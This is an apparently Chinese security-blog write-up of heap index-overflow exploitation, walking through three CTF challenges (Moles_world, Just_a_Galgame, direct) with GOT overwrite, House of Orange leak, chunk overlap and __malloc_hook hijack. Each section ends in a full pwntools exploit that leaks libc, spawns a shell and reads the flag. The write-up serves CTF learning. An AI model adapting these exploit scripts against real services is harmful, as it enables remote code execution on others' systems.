# 堆中index溢出类漏洞利用思路总结

阅读量 **137155**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-21 14:30:05

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01bb5c844d70510917.png)

## 0x01 写在前面

被问到这个问题，突然就意识到好像只能想到一个改`got`表的思路，有点丢人emmmm

于是做个总结，如果还有遗漏，欢迎大佬在评论区指出，我会在后续文章完善。

## 0x02 越界篡改GOT表

###  适用情形

  1. 题目没有开启`FULL RELRO`保护。
  2. 程序有可用`GOT`表项。

###  以 2020-CISCN-摩尔庄园的记忆 为例

我是本题的出题人，本题理论上应当用于2020年全国大学生信息安全竞赛，但是不知为何此题未出现，本题将会后续更新到我的Github，需要的同学可以自取~

####  程序保护

    
    
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    

####  程序分析

程序提供了四个功能：

  1. 用户指定一个`index`，随后在`chunk_list[index]`下分配一个`10 ~ 1010`之间大小的`chunk`然后读入内容。（此处是窝写的有问题，本来是想限制在`10 ~ 1000`的，所以会有`1%`的概率分配`chunk`失败导致程序退出。）
  2. `free`掉指定位置的`chunk`，并将对应指针清空，对应内存位置零。
  3. 可以修改任意一个`chunk`的前`0x10`个字节。
  4. 打印指定`chunk`的内容。

####  漏洞分析

四个功能都存在`index`溢出的问题，我们可以利用负数访问到非法内存。

再加上程序没有开启`FULL RELRO`，因此我们可以直接篡改`GOT`表完成利用。

####  漏洞利用

#####  寻找可利用指针

首先我们我们需要寻找一个可控指针以用来任意地址读写，经过查看内存

![](https://p5.ssl.qhimg.com/t012c961c0be18cf736.png)

发现有一个地址处形成了一个循环指针，这个位置的`index`是`chunk_list - 12`，我们就利用此处指针。

#####  泄露可利用指针地址

    
    
    creat(sh,1,'Chunk')
    delete(sh,1)
    show(sh,-12)
    useful_point_addr = get_address(sh=sh,info='THIS IS A USEFUL POINT VALUE : ',start_string='| [lahm\'s name] > ',end_string='\n--')
    

#####  泄露 Libc 地址

接下来我们将那个循环指针指向`GOT`表内的函数，以泄露`Libc`地址

    
    
    edit(sh,-12,p64(useful_point_addr - 0x88))
    show(sh,-12)
    libc.address = get_address(sh=sh,info='GLIBC ADDRESS : ',start_string='| [lahm\'s name] > ',end_string='\n--',offset=-libc.symbols['free'])
    

##### 劫持`GOT`表，完成利用

我们接下来将`free[@GOT](https://github.com/GOT "@GOT")`篡改为`system`，然后利用`free`函数触发即可。

#####  Final Exploit

    
    
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    
    Moles_world=ELF('./Moles_world', checksec = False)
    
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./Moles_world")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./Moles_world")
    
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'\x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    
    def creat(sh,index,value):
        sh.recvuntil('| [now] >')
        sh.sendline('G')
        sh.recvuntil('| [lahm\'s index] > ')
        sh.sendline(str(index))
        sh.recvuntil('| [lahm\'s name] > ')
        sh.send(value)
    
    def edit(sh,index,value):
        sh.recvuntil('| [now] >')
        sh.sendline('R')
        sh.recvuntil('| [lahm\'s index] > ')
        sh.sendline(str(index))
        sh.recvuntil('| [lahm\'s name begin ten char] > ')
        sh.send(value)
    
    def show(sh,index):
        sh.recvuntil('| [now] >')
        sh.sendline('S')
        sh.recvuntil('| [lahm\'s index] > ')
        sh.sendline(str(index))
    
    def delete(sh,index):
        sh.recvuntil('| [now] >')
        sh.sendline('A')
        sh.recvuntil('| [lahm\'s index] > ')
        sh.sendline(str(index))
    
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            creat(sh,0,'/bin/sh\x00')
            creat(sh,1,'Chunk')
            delete(sh,1)
            show(sh,-12)
            useful_point_addr = get_address(sh=sh,info='THIS IS A USEFUL POINT VALUE : ',start_string='| [lahm\'s name] > ',end_string='\n--')
            edit(sh,-12,p64(useful_point_addr - 0x88))
            show(sh,-12)
            libc.address = get_address(sh=sh,info='GLIBC ADDRESS : ',start_string='| [lahm\'s name] > ',end_string='\n--',offset=-libc.symbols['free'])
            edit(sh,-12,p64(libc.symbols['system']))
            delete(sh,0)
            # get_gdb(sh,stop=True)
            sh.interactive()
    
            get_gdb(sh,stop=True)
            sh.interactive()
            flag=get_flag(sh)
            # try:
            #     Multi_Attack()
            # except:
            #     throw('Multi_Attack_Err')
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
    

![](https://p0.ssl.qhimg.com/t01622608949c5f137e.png)

####  利用方式总结

此种利用方式就是利用了`index`可控，进而在`.text`段的`.got`区域分配`chunk`，进而控制`GOT`指针后完成利用的方式。

## 0x03 越界任意写全局变量

###  适用情形

程序中可以向`chunk_list`指针附近写入值。

###  以 2020-QWB-Just_a_Galgame 为例

####  程序保护

    
    
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    

####  程序分析

程序提供了`5`个功能：

  1. 申请一个大小为`0x68`大小的`Chunk`。(上限申请`6`个)
  2. 向指定的`Chunk`进行一次 **越界写** ，即，向该`chunk + 0x60`的位置写入`0x10`个字节。(上限`1`次)
  3. 申请一个`0x1000`大小的`Chunk`，在那之后，增加一次越界写次数。(上限`1`次)
  4. 依次打印所有`Chunk`的内容。(无上限次数)
  5. 当且仅当输入`No bye!`时，退出程序。

####  漏洞分析

此题没有提供任何的`free`函数调用，可以利用越界写来构造`Top Chunk`，再利用`House of Orange`的思路来`leak Libc`。

然后，在`edit`处存在另一个漏洞

![](https://p3.ssl.qhimg.com/t0127310af66b487c17.png)

此处在越界写时，程序使用了`atoi`函数，同时也没有对我们输入的数字以及对转换后的数值进行任何形式的验证。

这将导致我们`index`越界的情况发生。

####  漏洞利用

##### 泄露`libc`

首先可以利用越界写来写`Top Chunk`的`size`字段

![](https://p5.ssl.qhimg.com/t01c96a44ac9a7898bb.png)

接下来申请一个大的`chunk`

![](https://p2.ssl.qhimg.com/t01b5359fdd72ae3625.png)

现在，我们成功的向`unsorted bin`加入了`chunk`，接下来我们取回，即可泄露`libc`

![](https://p4.ssl.qhimg.com/t0162f3f27394c16902.png)

    
    
    creat_small(sh)
    edit(sh,0,p64(0)+p64(0xf91))
    creat_big(sh)
    creat_small(sh)
    show(sh)
    libc.address = get_address(sh,info='LIBC ADDRESS IS => ',start_string='1: ',end_string='\n',offset=-0x3c5188)
    

#####  利用越界达成任意写

此处要利用`bye`函数处的漏洞，我们先在`usr_want`位置写入`__malloc_hook - 0x60`的值

    
    
    bye(sh,p64(libc.symbols['__malloc_hook'] - 0x60))
    

然后利用`edit`函数即可写`__malloc_hook`为`one_gadgat`

    
    
    edit(sh,8,p64(libc.address + one_gadgets[3]))
    

最后触发利用即可

#####  Final Exploit

    
    
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    
    Just_a_Galgame=ELF('./Just_a_Galgame', checksec = False)
    one_gadgets=[0x45226,0x4527a,0xf0364,0xf1207]
    
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./Just_a_Galgame")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./Just_a_Galgame")
    
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'\x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    
    def creat_small(sh):
        sh.recvuntil('>> ')
        sh.send('1')
    
    def edit(sh,index,value):
        sh.recvuntil('>> ')
        sh.send('2')
        sh.recvuntil('idx >> ')
        sh.send(str(index))
        sh.recvuntil('movie name >> ')
        sh.send(value)
    
    def creat_big(sh):
        sh.recvuntil('>> ')
        sh.send('3')
    
    def show(sh):
        sh.recvuntil('>> ')
        sh.send('4')
    
    def bye(sh,value):
        sh.recvuntil('>> ')
        sh.send('5')
        sh.recvuntil('\nHotaru: Won\'t you stay with me for a while? QAQ\n')
        sh.send(value)
    
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            creat_small(sh)
            edit(sh,0,p64(0)+p64(0xf91))
            creat_big(sh)
            creat_small(sh)
            show(sh)
            libc.address = get_address(sh,info='LIBC ADDRESS IS => ',start_string='1: ',end_string='\n',offset=-0x3c5188)
    
            bye(sh,p64(libc.symbols['__malloc_hook'] - 0x60))
            edit(sh,8,p64(libc.address + one_gadgets[3]))
            creat_small(sh)
            # get_gdb(sh,stop=True)
            sh.interactive()
            flag=get_flag(sh)
            # try:
            #     Multi_Attack()
            # except:
            #     throw('Multi_Attack_Err')
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
    

![](https://p4.ssl.qhimg.com/t01e87a20e278b1001e.png)

## 0x04 越界篡改chunk结构

###  适用情形

  1. 越界可以修改`heap`内的内容
  2. 程序有`index`越界但是开启了全保护

###  以 2020-QWB-direct 为例

####  程序保护

    
    
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    

####  程序分析

程序提供了`5`个功能：

  1. 在用户指定的`index`(`index < 0xF`)处申请一个指定大小(`0 <= size <= 0x100`)的`Chunk`。
  2. 在用户指定的`Chunk_list[index] + offset`处写入`size - offset`长度的值。
  3. 释放指定的`Chunk_list[index]`，并将指针以及`size`清除。
  4. 调用`opendir`打开一个路径。
  5. 调用`readdir`读取该路径下的所有目录进入点。

####  漏洞分析

在向`chunk`写入内容时，由于没有对`offset`做任何检查，因此可以越界修改上一个`chunk`的任意内容，那么我们就可以利用`Off-by-one`的思路构造`Overlap`完成利用。

####  漏洞利用

##### 篡改`Size`域，构造`Heap Overlap`

首先申请两个`chunk`，然后调用`opendir`打开一个路径，由于`opendir`的特性，将同步生成一个大小为`0x8040`的`chunk`

    
    
    creat(sh,0,0x18)
    creat(sh,1,0x18)
    open_dir(sh)
    

![](https://p3.ssl.qhimg.com/t01a9d41ecea61348d7.png)

⚠️：最上方的大小为`0x250`的`chunk`为`scanf`缓冲区，无视即可。

接下来，使用`edit`函数修改第一个`chunk`的`size`域为`0x8080`，进而构造`heap Overlap`。

    
    
    edit(sh,0,-8,8,p64(0x8040 + 0x10 + 0x10 + 0x10 + 0x10 + 0x1))
    

![](https://p4.ssl.qhimg.com/t0192e386cc1e51e27e.png)

##### 劫持`DIR`结构体，泄露`libc`基址

首先调用`readdir`函数初始化整个`DIR`结构体

    
    
    get_dir(sh)
    

![](https://p3.ssl.qhimg.com/t014223e4de4d291fe3.png)

接下来将`libc`地址推到我们即将打印的位置上

    
    
    creat(sh,0,0x18)
    creat(sh,3,0x78)
    

![](https://p0.ssl.qhimg.com/t01abdddf068d1c91ff.png)

最后利用`edit`函数将`7fe1`处填充，以免截断即可完成`libc`的泄露

    
    
    creat(sh,4,0x88)
    edit(sh,4,-8,8,"Libc--->")
    get_dir(sh)
    

![](https://p4.ssl.qhimg.com/t017e6d968f5ee619e3.png)

##### 利用`Use After Free`完成最终利用

    
    
    delete(sh,1)
    edit(sh,3,0,8,p64(libc.symbols['__malloc_hook'] - 0x13))
    creat(sh,5,0x78)
    creat(sh,6,0x78)
    edit(sh,6,0,len('A'*0x13+p64(libc.address + one_gadgats[2])),'A'*0x13+p64(libc.address + one_gadgats[2]))
    creat(sh,7,0x78)
    

#####  Final Exploit

    
    
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    
    direct = ELF('./direct', checksec = False)
    one_gadgats = [0x4f365,0x4f3c2,0x10a45c]
    
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./direct")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./direct")
    
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'\x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'\x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    
    def creat(sh,index,chunk_size):
        sh.recvuntil('Your choice: ')
        sh.sendline('1')
        sh.recvuntil('Index: ')
        sh.sendline(str(index))
        sh.recvuntil('Size: ')
        sh.sendline(str(chunk_size))
    
    def edit(sh,index,offset,input_size,value):
        sh.recvuntil('Your choice: ')
        sh.sendline('2')
        sh.recvuntil('Index: ')
        sh.sendline(str(index))
        sh.recvuntil('Offset: ')
        sh.sendline(str(offset))
        sh.recvuntil('Size: ')
        sh.sendline(str(input_size))
        sh.recvuntil('Content: ')
        sh.sendline(value)
    
    def delete(sh,index):
        sh.recvuntil('Your choice: ')
        sh.sendline('3')
        sh.recvuntil('Index: ')
        sh.sendline(str(index))
    
    def open_dir(sh):
        sh.recvuntil('Your choice: ')
        sh.sendline('4')
    
    def get_dir(sh):
        sh.recvuntil('Your choice: ')
        sh.sendline('5')
    
    
    
    
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            creat(sh,0,0x18)
            creat(sh,1,0x18)
            open_dir(sh)
            creat(sh,2,0x18)
            edit(sh,0,-8,8,p64(0x8040 + 0x10 + 0x10 + 0x10 + 0x10 + 0x1))
            delete(sh,0)
            get_dir(sh)
            creat(sh,0,0x18)
            creat(sh,3,0x78)
            creat(sh,4,0x88)
            edit(sh,4,-8,8,"Libc--->")
            get_dir(sh)
            libc.address = get_address(sh,info='LIBC ADDRESS IS ',start_string='c--->',end_string='\n',offset=-0x3ebca0)
            delete(sh,1)
            edit(sh,3,0,8,p64(libc.symbols['__malloc_hook'] - 0x13))
            creat(sh,5,0x78)
            creat(sh,6,0x78)
            edit(sh,6,0,len('A'*0x13+p64(libc.address + one_gadgats[2])),'A'*0x13+p64(libc.address + one_gadgats[2]))
            creat(sh,7,0x78)
            # get_gdb(sh,stop=True)
            sh.interactive()
            flag=get_flag(sh)
            # try:
            #     Multi_Attack()
            # except:
            #     throw('Multi_Attack_Err')
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ERROR404** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/219092](/post/id/219092)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [heap](/tag/heap)

 **+1** __1赞

 __收藏

![](https://p5.ssl.qhimg.com/t01fc6ae8fa56997fe6.jpg) ERROR404

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

